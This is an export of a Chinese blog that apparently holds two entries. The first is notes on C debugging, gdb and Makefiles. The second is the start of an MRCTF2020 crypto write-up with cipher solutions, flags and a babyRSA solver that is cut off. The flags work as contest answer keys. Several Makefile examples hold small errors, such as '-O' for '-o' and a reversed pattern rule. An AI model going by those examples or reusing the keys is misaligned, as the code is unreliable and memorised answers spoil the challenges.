<p>设计规划错误：无论程序的规模大小，在创建它们之前都需要有一个设计规划的阶段。对程序员来说，一定要花点时间思考：如何构造程序，需要什么样的数据结构，它又应该如何在程序中使用。</p>
<p>代码编写错误：当然，每个人都会出现键入错误。在程序中遇到错误时，要重新阅读源代码或与其他人进行讨论。</p>
<p>可以试着在纸上执行程序的核心代码，这个过程被称为干运行。针对那些重要的例程，先记下它们的输入值，然后逐步手工计算出结果。</p>
<h2 id="一般调试技术"><a href="#一般调试技术" class="headerlink" title="一般调试技术"></a>一般调试技术</h2><p>一般方法是先运行程序并观察其输出结果，如果不能正常工作，我们就需要决定应该采取哪些措施。</p>
<p>（1）可以修改程序然后重新尝试（代码检查－试运行－出错法）</p>
<p>（2）在程序中增加一些语句以获得更多关于程序内部运行情况的信息（取样法）</p>
<p>（3）可以直接检查程序的运行情况（受控执行法）</p>
<p>调试的5个阶段</p>
<p>Testing(测试): 找出存在哪些缺陷或错误</p>
<p>Stabilization(固化): 使错误可重现</p>
<p>Localization(定位): 标识负责的代码行</p>
<p>Correction(纠正): 修复代码</p>
<p>Verification(验证): 确保修复程序有效</p>
<h3 id="取样法"><a href="#取样法" class="headerlink" title="取样法"></a>取样法</h3><p>检测是向程序中添加代码，目的是收集有关程序运行时行为的更多信息。<br>添加 <code>printf</code> 调用以在程序执行的不同阶段打印出变量的值是很常见的。<br>但是我们应该知道，只要更改程序，该过程就需要进行额外的编辑和编译，当然，在修复错误之后，我们将需要删除代码。</p>
<p>第一种技巧是用C语言的预处理器有选择的包括取样代码，这样只需重新编译程序就可以达到包含或去除调试代码的目的。<br>我们可以使用编译器标志 <code>-DDEBUG</code> 来编译程序，以定义DEBUG符号并包括多余的代码，也可以不排除它。</p>
<p>C语言预处理器定义的一些宏可以帮助我们进行调试。这些宏在扩展后会提供当前编译操作的相关信息。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Macro</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>__LINE__</td>
<td>A decimal representing the current line number</td>
</tr>
<tr>
<td>__FILE__</td>
<td>A string representing the current file name</td>
</tr>
<tr>
<td>__DATE__</td>
<td>A string of the form “Mmm dd yyyy”,the current date</td>
</tr>
<tr>
<td>__TIME__</td>
<td>A string of the form”hh:mm:ss”,the current time</td>
</tr>
</tbody>
</table>
</div>
<h2 id="使用GDB调试"><a href="#使用GDB调试" class="headerlink" title="使用GDB调试"></a>使用GDB调试</h2><p>gdb本身是一个基于文本的应用程序，但是它确实提供了一些捷径来帮助执行重复性任务。<br>许多版本具有历史记录的命令行编辑，因此您可以向后滚动并再次执行相同的命令（尝试使用光标键）。<br>所有版本都支持“空命令”。 按Enter键将再次执行最后一个命令。 当使用step或next命令逐行浏览程序时，此功能特别有用。</p>
<blockquote>
<p><a href="https://blog.csdn.net/niyaozuozuihao/article/details/91802994">linux下gdb调试方法与技巧整理</a></p>
</blockquote>
<h2 id="多个源文件的问题"><a href="#多个源文件的问题" class="headerlink" title="多个源文件的问题"></a>多个源文件的问题</h2><p>在编写小型程序时，许多人只需在编辑后通过重新编译所有文件即可重建其应用程序。<br>但是，对于较大的程序，这种简单方法的一些问题变得很明显。 编辑-编译-测试周期的时间将增加。<br>当只更改了一个文件时，即使是最有耐心的程序员也希望避免重新编译所有文件。<br>当创建多个头文件并将其包含在不同的源文件中时，可能会出现更困难的问题。</p>
<h2 id="make命令和Makefiles"><a href="#make命令和Makefiles" class="headerlink" title="make命令和Makefiles"></a>make命令和Makefiles</h2><p>您必须提供一个文件，告诉您如何构造您的应用程序。 该文件称为makefile。<br>生成文件最常与项目的其他源文件位于同一目录中。<br>如果您有一个大型项目，则可以选择对项目的不同部分使用单独的Makefile对其进行管理。<br>make命令和makefile的组合为管理项目提供了非常强大的工具。</p>
<h3 id="The-Syntax-of-Makefiles"><a href="#The-Syntax-of-Makefiles" class="headerlink" title="The Syntax of Makefiles"></a>The Syntax of Makefiles</h3><p>一个makefile由一组依赖关系和规则组成。</p>
<ul>
<li>依赖项具有目标（要创建的文件）和依赖项依赖的一组源文件。</li>
<li>规则描述了如何从相关文件中创建目标。</li>
<li>通常，目标是单个可执行文件。</li>
</ul>
<p>make文件由make命令读取，该命令确定要创建的目标文件，然后比较源文件的日期和时间，以决定需要调用哪些规则来构造目标。<br>通常，必须先创建其他中间目标，然后才能制定最终目标。<br>make命令使用makefile来确定目标的生成顺序以及要调用的规则的正确顺序。</p>
<h3 id="Options-and-Parameters-to-make"><a href="#Options-and-Parameters-to-make" class="headerlink" title="Options and Parameters to make"></a>Options and Parameters to make</h3><p>make程序本身有几个选项。 三种最常用的是</p>
<pre class="line-numbers language-none"><code class="language-none">-k           它告诉make在发现错误时继续进行。
-n           它告诉make打印出实际上会执行的操作。
-f &lt;文件名&gt;   它允许您告诉make将哪个文件用作其makefile。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要告诉make建立一个特定的目标，您可以传递目标名称作为参数。 如果不这样做，make会尝试创建makefile中列出的第一个目标。<br>许多程序员将所有目标都指定为其makefile中的第一个目标，然后将其他目标列为所有目标的依赖项。<br>当没有指定目标时，此约定使makefile在默认情况下应尝试构建的目标明确。</p>
<ol>
<li>Dependencies(依赖关系)</li>
</ol>
<p>依赖关系指定最终应用程序中的每个文件与源文件的关系。<br>在makefile中，我们通过编写目标名称，冒号，空格或制表符，然后用空格或制表符分隔的用于创建目标文件的文件列表来编写这些规则。</p>
<p> 我们的示例的依赖项列表是</p>
<pre class="line-numbers language-none"><code class="language-none">myapp: main.o 2.o 3.o
main.o: main.c a.h
2.o: 2.c a.h b.h
3.o: 3.c b.h c.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这表示myapp依赖于main.o，2.o和3.o，main.o依赖于main.c和a.h，依此类推。<br>这组依赖关系提供了一个层次结构，显示了源文件之间的关系。<br>如果我们希望制作多个文件，则可以全部使用phony目标。 假设我们的应用程序由二进制文件myapp和手册页myapp.1组成。 </p>
<p>我们可以用以下行来指定</p>
<pre class="line-numbers language-none"><code class="language-none">all: myapp myapp.l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>Rules(规则)</li>
</ol>
<p>makefile的第二部分指定描述如何创建目标的规则。</p>
<p>在上一节的示例中，在make命令确定2.o需要重建之后，应使用哪个命令？<br>如果我们需要指定一个include目录或设置符号信息选项以进行以后的调试该怎么办？<br>我们可以通过在makefile中指定显式规则来做到这一点。</p>
<p>大多数规则由一个简单的命令组成，该命令可以在命令行中键入。 对于我们的示例，我们将创建第一个makefile，</p>
<p>Makefile1：</p>
<pre class="line-numbers language-none"><code class="language-none">myapp: main.o 2.o 3.o
   gcc -o myapp main.o 2.o 3.o
main.o: main.c a.h
   gcc -c main.c
2.o: 2.c a.h b.h
   gcc -c 2.c
3.o: 3.c b.h c.h
   gcc -c 3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们使用-f选项调用make命令，因为我们的makefile没有通常的默认名称makefile或Makefile。<br>如果我们在不包含源代码的目录中调用此代码，则会收错误消息。</p>
<h3 id="Comments-in-a-Makefile"><a href="#Comments-in-a-Makefile" class="headerlink" title="Comments in a Makefile"></a>Comments in a Makefile</h3><p>生成文件中的注释以＃开头，并继续到该行的末尾。<br>像在C源文件中一样，makefile中的注释可以帮助作者和其他人了解编写文件时的意图。</p>
<h3 id="Macros-宏-in-a-Makefile"><a href="#Macros-宏-in-a-Makefile" class="headerlink" title="Macros(宏) in a Makefile"></a>Macros(宏) in a Makefile</h3><p>但是，对于包含大量文件的项目，它们也往往很大且不灵活。<br>我们通过写入MACRONAME = value来在makefile中定义一个宏，然后通过写入 $(MACRONAME) 或 $ {MACRONAME}来访问MACRONAME的值。<br>通过将行的其余部分保留在=空白之后，可以将宏的值设置为blank（空）。</p>
<pre class="line-numbers language-none"><code class="language-none">all: myapp
# Which compiler
CC &#x3D; gcc
# Where are include files kept
INCLUDE &#x3D; .
# Options for development
CFLAGS &#x3D; -g -Wall -ansi
# Options for release
# CFLAGS &#x3D; -O -Wall -ansi
myapp: main.o 2.o 3.o
   $(CC) -O myapp main.o 2.o 3.o
main.o: main.c a.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c main.c
2.o: 2.c a.h b.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c 2.c
3.o: 3.c b.h c.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c 3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实际上，make具有几个特殊的内部宏，您可以使用这些宏使makefile更加简洁。<br>这些宏中的每一个仅在使用前就展开，因此宏的含义可能会随着Makefile的进行而变化。</p>
<pre class="line-numbers language-none"><code class="language-none">$^ List of prerequisites of the current
$@ Name of the current target
$&lt; Name of the first prerequisite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="Multiple-Targets"><a href="#Multiple-Targets" class="headerlink" title="Multiple Targets"></a>Multiple Targets</h3><p>通常，制作多个目标文件或将几组命令收集到一个位置通常很有用。 我们可以扩展我们的makefile文件来做到这一点。<br>让我们添加一个“清除”选项以删除不需要的对象，并添加一个“安装”选项以将完成的应用程序移动到另一个目录。</p>
<pre class="line-numbers language-none"><code class="language-none">all: myapp
# Which compiler
CC &#x3D; gcc
# Where to install
INSTDIR &#x3D; &#x2F;usr&#x2F;local&#x2F;bin
# Where are include files kept
INCLUDE &#x3D; .
# Options for development
CFLAGS &#x3D; -g -Wall -ansi
# Options for release
# CFLAGS &#x3D; -O -Wall -ansi
myapp: main.o 2.o 3.o
   $(CC) -O myapp main.o 2.o 3.o
main.o: main.c a.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c main.c
2.o: 2.c a.h b.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c 2.c
3.o: 3.c b.h c.h
   $(CC) -I$(INCLUDE) $(CFLAGS) -c 3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<hr>
<pre class="line-numbers language-none"><code class="language-none">clean:
   -rm main.o 2.o 3.o
install: myapp
   @if [ -d $(INSTDIR) ]; \
      then \
      cp myapp $(INSTDIR); \
      chmod a+x $(INSTDIR)&#x2F;myapp; \
      chmod og-w $(INSTDIR)&#x2F;myapp; \
      echo &quot;Installed in $(INSTDIR)&quot;; \
   else \
      echo &quot;Sorry, $(INSTDIR) does not exist&quot;; \
   fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先，当我们执行make而不指定目标时，默认行为是构建目标myapp。<br>下一个要点与清洁和安装这两个附加目标有关。 该命令以-开头，它告诉make忽略命令的结果。<br>安装目标取决于myapp，因此要知道在执行其他安装命令之前，它必须先创建myapp。<br>该命令以@符号开头，告诉make在执行规则之前不要在标准输出上打印命令。</p>
<p>安装目标一个接一个地执行几个命令，以将应用程序安装在其最终的存放位置。 在执行下一个命令之前，它不会检查每个命令是否成功。<br>如果仅在前一个命令成功后才执行后续命令非常重要，那么我们可以编写由&amp;&amp;连接的命令，如下所示：</p>
<pre class="line-numbers language-none"><code class="language-none">@if [ -d $(INSTDIR) ]; \
   then \
   cp myapp $(INSTDIR) &amp;&amp; \
   chmod a+x $(INSTDIR)&#x2F;myapp &amp;&amp; \
   chmod og-w $(INSTDIR)&#x2F;myapp &amp;&amp; \
   echo &quot;Installed in $(INSTDIR)&quot;; \
else \
   echo &quot;Sorry, $(INSTDIR) does not exist&quot;; false; \
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Suffix-and-Pattern-Rules"><a href="#Suffix-and-Pattern-Rules" class="headerlink" title="Suffix and Pattern Rules"></a>Suffix and Pattern Rules</h3><p>我们看到内置规则在使用时都有后缀，所以给出带有某个特定后缀的文件时，make命令知道应该用哪个规则来创建带有另一个不同后缀名的文件。</p>
<ul>
<li>最常见的一条规则是，通过一个以.c为后缀名的文件创建出一个以.o为后缀名的文件。</li>
</ul>
<p>要添加新的后缀规则，我们首先在makefile中添加一行，以告知make有关新后缀的信息； 然后，我们可以使用该新后缀编写一条规则。</p>
<p>nmake uses the special syntax </p>
<p> <em>.&lt;<strong>old_suffix</strong>&gt;.&lt;<strong>new_suffix</strong>&gt;:</em></p>
<p>定义用于从具有相同基本名称但具有旧后缀的文件中创建具有新后缀的文件的一般规则。<br>这是我们制作文件的一部分，其中包含将.cpp文件转换为.o文件的新通用规则：</p>
<pre class="line-numbers language-none"><code class="language-none">.SUFFIXES:    .cpp
.cpp.o:
  $(CC) -xc++ $(CFLAGS) -I$(INCLUDE) -c $&lt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>make的最新版本包括实现相同效果的替代语法，以及更多其他功能。</p>
<pre class="line-numbers language-none"><code class="language-none">%.cpp: %o
   $(CC) -xc++ $(CFLAGS) -I$(INCLUDE) -c $&lt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Managing-Libraries-with-make"><a href="#Managing-Libraries-with-make" class="headerlink" title="Managing Libraries with make"></a>Managing Libraries with make</h3><p>在处理较大的项目时，通常可以使用库来管理多个编译产品。<br>语法为lib（file.o），这表示目标文件file.o，存储在库lib.a中。<br>make命令具有一个用于管理库的内置规则，该规则通常等效于以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">.c.a:
   $(CC) -c $(CFLAGS) $&lt;
   $(AR) $(ARFLAGS) $@ $*.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>对于大型项目，一种比较方便的做法是用函数库来管理多个编译产品。</p>
<p>$*不包括后缀名的当前依赖文件的名字</p>
<p>宏 <code>\$(AR)</code> 和 <code>\$(ARFLAGS)</code> 通常分别默认为命令ar和选项rv。<br>简洁的语法告诉我们，要从.c文件到.a库，它必须应用两个规则：</p>
<ul>
<li>第一条规则说，它必须编译源文件并生成一个对象。</li>
<li>第二条规则说使用ar命令修改库，添加新的目标文件。</li>
</ul>
<p><strong>Managing a Library</strong></p>
<p>更改应用程序，使文件2.o和3.o保存在名为mylib.a的库中</p>
<pre class="line-numbers language-none"><code class="language-none">all: myapp
# Which compiler
CC &#x3D; gcc
# Where to install
INSTDIR &#x3D; &#x2F;usr&#x2F;local&#x2F;bin
# Where are include files kept
INCLUDE &#x3D; .
# Options for development
CFLAGS &#x3D; -g -Wall -ansi
# Options for release
# CFLAGS &#x3D; -O -Wall -ansi
# Local Libraries
MYLIB &#x3D; mylib.a
myapp: main.o $(MYLIB)
   $(CC) -o myapp main.o $(MYLIB)
$(MYLIB): $(MYLIB)(2.o) $(MYLIB) 3.o
main.o: main.c a.h
2.o: 2.c a.h b.h
3.o: 3.c b.h c.h
clean:
   -rm main.o 2.o 3.o $(MYLIB)
install: myapp
   @if [ -d $(INSTDIR) ]; \
      then \
      cp myapp $(INSTDIR); \
      chmod a+x $(INSTDIR)&#x2F;myapp; \
      chmod og-w $(INSTDIR)&#x2F;myapp; \
      echo &quot;Installed in $(INSTDIR)&quot;; \
   else \
      echo &quot;Sorry, $(INSTDIR) does not exist&quot;; \
   fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Makefiles-and-Subdirectories"><a href="#Makefiles-and-Subdirectories" class="headerlink" title="Makefiles and Subdirectories"></a>Makefiles and Subdirectories</h3><p>对于大型的项目，有时我们希望能把组成一个函数库的几个文件从主文件中分离出来，并将它们保存到一个子目录中。</p>
<p>首先在子目录中编写出第二个makefile文件，它的作用是编译该子目录下的源文件并将它们保存到一个函数库中，然后将该库文件拷贝到上一级的主目录中。</p>
<p>在主目录中的makefile文件包含一个用于制作函数库的规则，该规则会调用第二个makfile文件。</p>
<p>Make命令调用这条规则来创建函数库时，它将切换到子目录mylibdirectory中，然后调用一个新的make命令来管理函数库。由于make会针对每个命令调用一个新的shell，使用第二个makefile文件的make命令本身又没有执行cd命令，但它又必须在一个不同的目录下创建函数库，为解决这一问题，我们用括号将这两个命令括起来，以使它们只被一个单独的shell处理</p>
<pre class="line-numbers language-none"><code class="language-none">mylib.a:
   (cdmylibdirctory;$(MAKE))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>NEU</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Misc&amp;Crypto部分Write Up</title>
    <url>/2020/04/30/mrctf2020-misc-crypto-bu-fen-writeup/</url>
    <content><![CDATA[<p>还是太菜，害</p>
<p>有几题后面借鉴大佬的博客才做出来的，在BUU复现</p>
<span id="more"></span>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="天干地支-甲子"><a href="#天干地支-甲子" class="headerlink" title="天干地支+甲子"></a>天干地支+甲子</h2><p>查一下每一个代表的数字，然后加上60（甲子），ASCII转一下就ok</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">]</span>
 
<span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>MRCTF&#123;Goodjob&#125;</code></p>
<h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p>键盘密码，手机9键走起</p>
<p>解出来是mobilephond，改一下mobilephone</p>
<p><code>MRCTF&#123;mobilephone&#125;</code></p>
<h2 id="古典密码知多少"><a href="#古典密码知多少" class="headerlink" title="古典密码知多少"></a>古典密码知多少</h2><p>蓝色：猪圈密码，黄色：圣武士堂密码，黑色：银河密码</p>
<p>解出来：FGCPFLIRTUASYON</p>
<p>然后栅栏一下：FLAGISCRYPTOFUN</p>
<p>最后<code>MRCTF&#123;CRYPTOFUN&#125;</code></p>
<h2 id="vigenere"><a href="#vigenere" class="headerlink" title="vigenere"></a>vigenere</h2><p>直接在线解密：<a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
<pre class="line-numbers language-none"><code class="language-none">a declaration of the independence of cyberspace
by john perry barlow 
governments of the industrial world, you weary giants of flesh and steel, i come from cyberspace, the new home of mind. on behalf of the future, i ask you of the past to leave us alone. you are not welcome among us. you have no sovereignty where we gather.
we have no elected government, nor are we likely to have one, so i address you with no greater authority than that with which liberty itself always speaks. i declare the global social space we are building to be naturally independent of the tyrannies you seek to impose on us. you have no moral right to rule us nor do you possess any methods of enforcement we have true reason to fear.
governments derive their just powers from the consent of the governed. you have neither solicited nor received ours. we did not invite you. you do not know us, nor do you know our world. cyberspace does not lie within your borders. do not think that you can build it, as though it were a public construction project. you cannot. it is an act of nature and it grows itself through our collective actions.
you have not engaged in our great and gathering conversation, nor did you create the wealth of our marketplaces. you do not know our culture, our ethics, or the unwritten codes that already provide our society more order than could be obtained by any of your impositions.
you claim there are problems among us that you need to solve. you use this claim as an excuse to invade our precincts. many of these problems don&#39;t exist. where there are real conflicts, where there are wrongs, we will identify them and address them by our means. we are forming our own social contract. this governance will arise according to the conditions of our world, not yours. our world is different.
cyberspace consists of transactions, relationships, and thought itself, arrayed like a standing wave in the web of our communications. ours is a world that is both everywhere and nowhere, but it is not where bodies live.
we are creating a world that all may enter without privilege or prejudice accorded by race, economic power, military force, or station of birth.
we are creating a world where anyone, anywhere may express his or her beliefs, no matter how singular, without fear of being coerced into silence or conformity.
your legal concepts of property, expression, identity, movement, and context do not apply to us. they are all based on matter, and there is no matter here.
our identities have no bodies, so, unlike you, we cannot obtain order by physical coercion. we believe that from ethics, enlightened self-interest, and the commonweal, our governance will emerge. our identities may be distributed across many of your jurisdictions. the only law that all our constituent cultures would generally recognize is the golden rule. we hope we will be able to build our particular solutions on that basis. but we cannot accept the solutions you are attempting to impose.
in the united states, you have today created a law, the telecommunications reform act, which repudiates your own constitution and insults the dreams of jefferson, washington, mill, madison, detoqueville, and brandeis. these dreams must now be born anew in us.
you are terrified of your own children, since they are natives in a world where you will always be immigrants. because you fear them, you entrust your bureaucracies with the parental responsibilities you are too cowardly to confront yourselves. in our world, all the sentiments and expressions of humanity, from the debasing to the angelic, are parts of a seamless whole, the global conversation of bits. we cannot separate the air that chokes from the air upon which wings beat.
in china, germany, france, russia, singapore, italy and the united states, you are trying to ward off the virus of liberty by erecting guard posts at the frontiers of cyberspace. these may keep out the contagion for a small time, but they will not work in a world that will soon be blanketed in bit-bearing media.
your increasingly obsolete information industries would perpetuate themselves by proposing laws, in america and elsewhere, that claim to own speech itself throughout the world. these laws would declare ideas to be another industrial product, no more noble than pig iron. in our world, whatever the human mind may create can be reproduced and distributed infinitely at no cost. the global conveyance of thought no longer requires your factories to accomplish.
these increasingly hostile and colonial measures place us in the same position as those previous lovers of freedom and self-determination who had to reject the authorities of distant, uninformed powers. we must declare our virtual selves immune to your sovereignty, even as we continue to consent to your rule over our bodies. we will spread ourselves across the planet so that no one can arrest our thoughts.
we will create a civilization of the mind in cyberspace. may it be more humane and fair than the world your governments have made before.
flag is mrctf vigenere crypto crack man, please add underscore and curly braces.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<code>MRCTF&#123;vigenere_crypto_crack_man&#125;</code></p>
<h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>看了一下源代码，找到p和q就行，然后先看p</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_p :"</span><span class="token punctuation">,</span> P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    factor <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_factor :"</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为已经给出了P[9]，而且使用的是nextprime()，即可以将数组测试出来，这样就得到了这里面的n，从而得到后面需要的p</p>
<p>然后看q</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sub_Q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q_1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q_2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q <span class="token operator">=</span> sub_Q <span class="token operator">**</span> Q_2 <span class="token operator">%</span> Q_1
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_1: "</span><span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_2: "</span><span class="token punctuation">,</span> Q_2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sub_Q: "</span><span class="token punctuation">,</span> sub_Q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接使用pow(sub_Q,Q-2,Q_1)得到Q，然后nextprime得到q<br>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">import</span> sympy
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime

e <span class="token operator">=</span> <span class="token number">65537</span>
factor <span class="token operator">=</span> <span class="token number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span>

p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991142909</span>
p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991142911</span>
p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991142977</span>
p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143071</span>
p<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143103</span>
p<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143121</span>
p<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143133</span>
p<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143317</span>
p<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143401</span>
p<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">206027926847308612719677572554991143421</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
